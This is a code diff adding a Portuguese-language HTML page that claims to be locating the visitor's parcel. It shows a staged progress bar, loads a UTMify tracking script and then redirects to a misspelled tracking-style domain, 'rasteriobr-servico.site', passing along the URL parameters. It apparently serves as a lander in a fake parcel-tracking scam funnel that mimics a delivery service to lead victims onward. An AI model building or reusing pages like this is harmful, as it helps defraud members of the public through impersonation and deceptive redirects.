@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF‑8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Carregando rastreamento...</title>
+
+  <!-- UTMify para rastrear parâmetros UTM -->
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async defer
+  ></script>
+
+  <style>
+    body {
+      margin:0; padding:0;
+      background: linear-gradient(#fff, #e3f2fd);
+      font-family:'Segoe UI',sans-serif;
+      display:flex; align-items:center;
+      justify-content:center; height:100vh;
+      text-align:center;
+    }
+    .box {
+      background:#bbdefb; padding:40px; border-radius:14px;
+      box-shadow:0 10px 30px rgba(0,0,0,0.15);
+      width:90%; max-width:400px;
+      animation:fadeIn 0.7s ease;
+    }
+    .box h1 { color:#1a237e; font-size:22px; margin-bottom:20px; }
+    .progress-container {
+      width:100%; background:#e0e0e0; border-radius:10px;
+      overflow:hidden; height:25px; position:relative;
+    }
+    .progress-bar {
+      height:100%; width:0%;
+      background:linear-gradient(to right,#0288d1,#0277bd);
+      transition: width 1s ease-out;
+    }
+    .percent {
+      position:absolute; width:100%;
+      top:0; left:0; line-height:25px;
+      color:#fff; font-weight:bold;
+      text-shadow:1px 1px 2px rgba(0,0,0,0.5);
+    }
+    .complete {
+      animation: pulse 0.5s ease-in-out 2;
+    }
+    @keyframes fadeIn {
+      from { opacity:0; transform: translateY(20px); }
+      to { opacity:1; transform: translateY(0); }
+    }
+    @keyframes pulse {
+      0%,100% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="box">
+    <h1>🔄 Localizando sua encomenda...</h1>
+    <div class="progress-container">
+      <div class="progress-bar" id="progressBar"></div>
+      <div class="percent" id="percentText">0%</div>
+    </div>
+  </div>
+
+  <script>
+    const bar = document.getElementById('progressBar');
+    const text = document.getElementById('percentText');
+    let width = 0;
+    const duration = 1000; // duração da animação da barra em ms
+    const interval = 20;   // intervalo para atualizar contador
+    const step = 100 / (duration / interval);
+
+    // Captura parâmetros da URL — por exemplo: ?utm_source=...&id=...
+    const params = window.location.search;
+    const baseURL = 'https://www.rasteriobr-servico.site/consultar.htm';
+
+    const timer = setInterval(() => {
+      width += step;
+      if (width >= 100) {
+        width = 100;
+        clearInterval(timer);
+        bar.classList.add('complete');
+        text.classList.add('complete');
+        // Adiciona 1,5s antes de redirecionar
+        setTimeout(() => {
+          window.location.href = baseURL + params;
+        }, 1500);
+      }
+      bar.style.width = width + '%';
+      text.textContent = Math.floor(width) + '%';
+    }, interval);
+
+    // Inicia a animação da barra após carregada
+    setTimeout(() => bar.style.width = '100%', 10);
+  </script>
+
+</body>
+</html>
